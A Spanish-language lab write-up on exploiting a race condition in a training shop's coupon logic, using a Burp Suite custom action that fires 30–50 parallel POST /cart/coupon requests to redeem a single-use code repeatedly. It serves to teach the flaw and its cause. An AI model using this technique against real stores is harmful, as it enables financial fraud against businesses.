# 1. Race Condition Superando Límites de Descuento

## 🧨 Condición de carrera superando límites de descuento

### 📄 Descripción del laboratorio

El laboratorio presenta una **condición de carrera en la lógica de aplicación de cupones de descuento**.

La validación del cupón y el registro de su uso **no se realizan de forma atómica**, lo que permite aplicar el mismo cupón varias veces si las peticiones se envían de manera concurrente.

El objetivo es:

* Comprar la **Lightweight "l33t" Leather Jacket** (precio ≈ 1337)
* Disponiendo únicamente de **100 de crédito** (≈ 50$ en algunas variantes del lab)

Credenciales:

```
wiener:peter
```

***

### 📚 Teoría

Una **race condition en lógica de negocio** ocurre cuando varias operaciones críticas que deberían ejecutarse de forma secuencial se solapan en el tiempo debido a concurrencia, provocando estados inconsistentes.

#### 📌 Flujo normal del cupón

1. El usuario envía un cupón (ej. `SIGNUP30`, 30% de descuento, uso único)
2. El servidor comprueba si el cupón es válido y no ha sido usado
3. Se aplica el descuento
4. El servidor marca el cupón como **redeemed**

#### 📌 El fallo

El problema es que los pasos **2 → 4 no están protegidos por un lock, transacción o mecanismo atómico**.

Si enviamos muchas peticiones simultáneas aplicando el mismo cupón:

* Varias pasan la validación antes de que el estado “used” se persista
* El descuento se aplica múltiples veces
* El precio final cae por debajo del crédito disponible

#### 📌 Impacto

Este tipo de fallo es clásico en:

* Limit overrun
* Cupones de uso único
* Créditos promocionales
* Sistemas de puntos o wallets

Y puede provocar **impacto económico real** en producción.

***

### 📝 Práctica

#### 1️⃣ Preparación

Iniciamos sesión con:

```
wiener:peter
```

Añadimos al carrito:

* Lightweight "l33t" Leather Jacket

Aplicamos manualmente el cupón:

```
SIGNUP30
```

Observamos:

* Funciona correctamente la primera vez
* Si lo intentamos de nuevo:

```
Coupon has already been redeemed
```

📌 Aquí entra la condición de carrera.

***

#### 2️⃣ Burp Suite Professional: acción personalizada

Para explotar esta vulnerabilidad de forma fiable usamos **Burp Suite Professional**, concretamente una **acción personalizada (Bambda)**.

Burp Pro incluye una acción perfecta para este escenario.

**Código de la acción**

```javascript
id: eb57d5bd-33e2-4a8c-bf51-bc81bd26613a
name: Probe for race condition
function: CUSTOM_ACTION
location: REPEATER
source: |+
  /**
  * Repeats the request 10 times to trigger race conditions or request smuggling,
  * using the single-packet attack for HTTP/2, and last-byte synchronisation for HTTP/1
  *
  * @author James Kettle
  **/
  int NUMBER_OF_REQUESTS = 10;
  var reqs = new ArrayList<HttpRequest>();
  for (int i = 0; i < NUMBER_OF_REQUESTS; i++) {
      reqs.add(requestResponse.request());
  }
  
  var responses = api().http().sendRequests(reqs); 
  var codes = responses.stream()
      .map(HttpRequestResponse::response)
      .map(HttpResponse::statusCode)
      .toList();
  logging().logToOutput(codes);
```

**Dónde cargarla**

```
Extensions → Bambda library → New
```

<figure><img src="../../../.gitbook/assets/image (733).png" alt=""><figcaption></figcaption></figure>

Pegamos el código, guardamos y ya podremos usarla en Repeater.

📌 Qué hace esta acción:

* Duplica la misma request múltiples veces
* Las envía **en paralelo (no secuencial)**
* Usa:
  * HTTP/2 → single-packet attack
  * HTTP/1 → last-byte synchronisation

Esto garantiza concurrencia real, clave para explotar la race condition.

***

#### 3️⃣ Disparar la carrera

Preparamos el ataque:

* Vaciamos el carrito
* Eliminamos cualquier cupón aplicado
* Añadimos de nuevo la chaqueta

Interceptamos con Proxy la petición:

```http
POST /cart/coupon
coupon=SIGNUP30
```

La enviamos a **Repeater**.

Cargamos la acción:

```
Custom actions → Load
```

📌 Ajuste importante:

Modificamos:

```javascript
int NUMBER_OF_REQUESTS = 10;
```

por:

```
30–50
```

👉 Cuantas más peticiones simultáneas, mayor probabilidad de éxito.

#### 4️⃣ Ejecutar

Ejecutamos la acción.

Burp envía todas las peticiones en paralelo.

En el backend ocurre:

* Varias requests pasan la validación
* Antes de que el cupón se marque como usado

Resultado:

* El descuento se aplica múltiples veces
